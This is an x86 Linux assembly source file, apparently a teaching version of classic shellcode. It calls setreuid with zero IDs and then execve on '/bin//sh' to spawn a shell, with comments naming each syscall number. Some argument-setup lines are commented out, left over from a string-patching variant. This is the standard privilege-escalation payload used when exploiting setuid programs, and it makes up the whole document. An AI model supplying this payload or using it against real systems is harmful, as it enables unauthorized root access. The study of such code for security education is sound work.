section .data    ; section declaration

shell db   '/bin//sh'       ; the string

section .text    ; section declaration

global _start ; Default entry point for ELF linking

_start:

; setreuid(uid_t ruid, uid_t euid)

 xor eax, eax
 xor ebx, ebx
 xor ecx, ecx
 mov al, 70       ; put 70 into eax, since setreuid is syscall #70
 int 0x80          ; Call the kernel to make the system call happen

; execve(const char *filename, char *const argv [], char *const envp[])
 xor eax, eax
 mov ebx, shell; put the address of the string into ebx
                   ; ( 7 bytes offset from the beginning)
 ;mov [ebx+8], ebx  ; put the address of the string from ebx where the
                   ; AAAA is in the string ( 8 bytes offset)
 ;mov [ebx+12],eax ; put the a NULL address (4 bytes of 0) where the
                   ; BBBB is in the string ( 12 bytes offset)
 mov al, 11       ; Now put 11 into eax, since execve is syscall #11
 ;lea ecx, [ebx+8]  ; Load the address of where the AAAA was in the
                   ; string into ecx
 ;lea edx, [ebx+12] ; Load the address of where the BBBB is in the
                   ; string into edx
 int 0x80          ; Call the kernel to make the system call happen
